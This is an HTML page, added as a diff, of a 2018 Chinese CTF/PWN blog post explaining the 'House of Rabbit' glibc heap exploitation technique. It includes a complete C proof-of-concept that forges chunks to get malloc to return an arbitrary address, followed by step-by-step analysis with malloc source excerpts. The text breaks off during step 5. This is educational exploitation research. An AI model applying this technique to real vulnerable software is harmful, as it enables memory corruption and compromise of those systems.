@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        House Of Rabbit 原理 · p4nda&#39;s blog
+        
+    </title>
+    <link rel="icon" href= /assets/p4nda.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro {
+            position: relative;
+            width: 100%;
+            height: 50vh;
+            overflow: hidden;
+            box-shadow: -0.1rem 0 0.5rem 0 rgba(0, 0, 0, 0.5);
+        }
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20180120 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >p4nda@dubhe</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">House Of Rabbit 原理</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>p4nda@dubhe</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.png)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            House Of Rabbit 原理
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = CTF>CTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = PWN>PWN</a>
+    
+</div>
+            
+            <script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "1", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = "/static/api/js/share.js"];</script>
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/04/18</span>
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe604;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">
+                        &#xe601;
+                    </span>
+                    <span class="bdsharebuttonbox">
+                        <a href="#" class="bds_more shareText" data-cmd="more">Share</a>
+                    </span>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到<strong>任意</strong>地址分配的目的。</p>
+<h1 id="所需条件"><a href="#所需条件" class="headerlink" title="所需条件"></a>所需条件</h1><ol>
+<li>可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处）</li>
+<li>存在一块已知地址的内存空间，并可以任意写至少<strong>0x20</strong>长度的字节</li>
+<li>存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。</li>
+</ol>
+<p>当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？）</p>
+<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>在<a href="https://github.com/shift-crops/House_of_Rabbit/blob/master/house_of_rabbit.c" target="_blank" rel="noopener">此处</a>有可以使用的样例文件，来自 <a href="https://github.com/shift-crops" target="_blank" rel="noopener">shift-crops</a> ，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   PoC of House of Rabbit</span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 16.04 (64bit).</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   Yutaro Shimizu</span></span><br><span class="line"><span class="comment">   @shift_crops</span></span><br><span class="line"><span class="comment">   2017/09/14</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> target[<span class="number">0x10</span>] = <span class="string">"Hello, World!"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gbuf[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *p, *fast, *small, *fake;</span><br><span class="line">	<span class="keyword">char</span> *victim;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(	<span class="string">"This is PoC of House of Rabbit\n"</span></span><br><span class="line">		<span class="string">"This technique bypassing Heap ASLR without leaking address, "</span></span><br><span class="line">		<span class="string">"and make it possible to overwrite a variable located at an arbitary address.\n"</span></span><br><span class="line">		<span class="string">"Jump like a rabbit and get an accurate address by malloc! :)\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 1. Make 'av-&gt;system_mem &gt; 0xa00000'</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">	p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte by mmap at %p, and free.\n"</span>, p);</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">	p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte in heap at %p, and free.\n"</span>, p);</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2. Free fast chunk and link to fastbins</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2. Free fast chunk and link to fastbins\n"</span>);</span><br><span class="line">	fast = <span class="built_in">malloc</span>(<span class="number">0x10</span>); 		<span class="comment">// any size in fastbins is ok </span></span><br><span class="line">	small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(	<span class="string">"  Allocate fast chunk and small chunk.\n"</span></span><br><span class="line">		<span class="string">"  fast = %p\n"</span></span><br><span class="line">		<span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line">	<span class="built_in">free</span>(fast);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 3. Make fake_chunk on .bss</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"3. Make fake_chunk on .bss\n"</span>);</span><br><span class="line">	gbuf[<span class="number">1</span>] = <span class="number">0x11</span>;	</span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;	</span><br><span class="line">	<span class="built_in">printf</span>(	<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line">		<span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">		, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// VULNERABILITY</span></span><br><span class="line">	<span class="comment">// use after free or fastbins dup etc...</span></span><br><span class="line">	fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line">	<span class="built_in">printf</span>(	<span class="string">"VULNERABILITY (e.g. UAF)\n"</span></span><br><span class="line">		<span class="string">"  *fast = %p\n"</span></span><br><span class="line">		, fake);</span><br><span class="line">	*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 4. call malloc_consolidate</span></span><br><span class="line">	<span class="built_in">printf</span>(	<span class="string">"4. call malloc_consolidate\n"</span></span><br><span class="line">		<span class="string">"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"</span></span><br><span class="line">		, small, fake);</span><br><span class="line">	<span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 5. Link unsorted bins to appropriate list</span></span><br><span class="line">	<span class="built_in">printf</span>(	<span class="string">"5. Link unsorted bins to appropriate list\n"</span></span><br><span class="line">		<span class="string">"  Rewrite fake_chunk1's size to 0xa0001 to bypass 'size &lt; av-&gt;system_mem' check.\n"</span>);</span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0xa00001</span>;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(	<span class="string">"  Allocate huge chunk.\n"</span></span><br><span class="line">		<span class="string">"  Now, fake_chunk1 link to largebin[126](max).\n"</span></span><br><span class="line">		<span class="string">"  Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n"</span>);</span><br><span class="line">	gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 6. Overwrite targer variable</span></span><br><span class="line">	<span class="built_in">printf</span>(	<span class="string">"6. Overwrite targer variable on .data\n"</span></span><br><span class="line">		<span class="string">"  target is at %p\n"</span></span><br><span class="line">		<span class="string">"  Before : %s\n"</span></span><br><span class="line">		, &amp;target, target);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>((<span class="keyword">void</span>*)&amp;target-(<span class="keyword">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">	victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"  Allocate 0x10 byte at %p, and overwrite.\n"</span>, victim);</span><br><span class="line">	<span class="built_in">strcpy</span>(victim, <span class="string">"Hacked!!"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"  After  : %s\n"</span>, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面对这个利用方法进行分步解析</p>
+<h2 id="步骤1-增大malloc函数中-mmap分配阈值"><a href="#步骤1-增大malloc函数中-mmap分配阈值" class="headerlink" title="步骤1 增大malloc函数中 mmap分配阈值"></a>步骤1 增大malloc函数中 mmap分配阈值</h2><p>当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下：</p>
+<p>分配代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) </span><br><span class="line">   &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">   &#123;</span><br><span class="line">      ……</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>阈值改变：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned long sum;</span><br><span class="line">sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">atomic_max (&amp;mp_.max_mmapped_mem, sum);</span><br></pre></td></tr></table></figure>
+<p>因此在第一阶段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. Make 'av-&gt;system_mem &gt; 0xa00000'</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte by mmap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte in heap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"</span>);</span><br></pre></td></tr></table></figure>
+<p>第一次程序malloc(0xa00000)时，堆块由mmap分配，并且mp_.max_mmaped_mem变成0xa10000，当free以后再次malloc(0xa00000)时，系统会首先通过sbrk扩大top块进行分配，当最后一次free后，top大小变成0xa20c31 &gt; 0xa00000</p>
+<p><img src="/img/house_of_rabbit/1.png" alt=""></p>
+<h2 id="步骤2-申请小堆块并放入fastbin"><a href="#步骤2-申请小堆块并放入fastbin" class="headerlink" title="步骤2  申请小堆块并放入fastbin"></a>步骤2  申请小堆块并放入fastbin</h2><p>首先malloc(0x20) ，再次malloc(0x80)，这两块都是由top直接切割得到，保证small bin大小的块挨着top。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. Free fast chunk and link to fastbins</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk and link to fastbins\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x20</span>); 		<span class="comment">// any size in fastbins is ok </span></span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(	<span class="string">"  Allocate fast chunk and small chunk.\n"</span></span><br><span class="line">	<span class="string">"  fast = %p\n"</span></span><br><span class="line">	<span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br></pre></td></tr></table></figure>
+<p>此时，对应的堆结构是：</p>
+<p><img src="/img/house_of_rabbit/2.png" alt=""></p>
+<h2 id="步骤3-伪造堆块并劫持至fastbin"><a href="#步骤3-伪造堆块并劫持至fastbin" class="headerlink" title="步骤3 伪造堆块并劫持至fastbin"></a>步骤3 伪造堆块并劫持至fastbin</h2><p>在一个已知地址的内存处（如未开启PIE的程序BSS段）伪造两个连续的堆块，一个堆块大小是0x11，紧挨着是0xfffffffffffffff1，这样可以保证后续操作可以覆盖到任意地址。更重要的是这个0x11的小块即是大块的前块，也是大块的后块，可以保证在malloc中通过检查。</p>
+<p>利用漏洞劫持fastbin，将大小为0xfffffffffffffff1的堆块，挂到fastbin上去。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. Make fake_chunk on .bss</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Make fake_chunk on .bss\n"</span>);</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x11</span>;	</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;	</span><br><span class="line"><span class="built_in">printf</span>(	<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line">	<span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">	, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// use after free or fastbins dup etc...</span></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(	<span class="string">"VULNERABILITY (e.g. UAF)\n"</span></span><br><span class="line">	<span class="string">"  *fast = %p\n"</span></span><br><span class="line">	, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br></pre></td></tr></table></figure>
+<p>此时，堆块状态如下：</p>
+<p><img src="/img/house_of_rabbit/3.png" alt=""></p>
+<h2 id="步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin"><a href="#步骤4-利用malloc-consolidate使伪造堆块进入unsorted-bin" class="headerlink" title="步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin"></a>步骤4 利用malloc_consolidate使伪造堆块进入unsorted bin</h2><p>在free函数中，当释放的块大于 65536时，会触发malloc_consolidate，这个函数用于对fastbin合并，并放到unsorted bin中。</p>
+<p>触发代码如下：(malloc.c 4071)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">		malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>而在malloc_consolidate()中，会循环处理各fastbin堆块，当堆块与top相邻时，与top合并。否则，将堆块放入unsorted bin中，并设置pre_size和pre_inuse位，此时较小的堆块变成 0xffffffffffffffff0  0x10</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;</span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对应步骤代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4. call malloc_consolidate</span></span><br><span class="line"><span class="built_in">printf</span>(	<span class="string">"4. call malloc_consolidate\n"</span></span><br><span class="line">	<span class="string">"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"</span></span><br><span class="line">	, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br></pre></td></tr></table></figure>
+<p>步骤结束后，内存分布如下：</p>
+<p><img src="/img/house_of_rabbit/4.png" alt=""></p>
+<h2 id="步骤5-分配内存-使伪造堆块进入large-bin"><a href="#步骤5-分配内存-使伪造堆块进入large-bin" class="headerlink" title="步骤5 分配内存 使伪造堆块进入large bin"></a>步骤5 分配内存 使伪造堆块进入large bin</h2><p>当伪造的堆块进入unsorted bin时，并不能达到目的，需要进一步使堆块进入large bin，此时需要将伪造的堆块大小改为0xa00001，其目的有两个，1是绕过程序对unsorted bin中内存块大小小于av-&gt;system_mem的检测；2是使程序放入large bin的最后一块（&gt;0x800000)</p>
+<p>malloc检测如下（malloc.c 3473）</p>
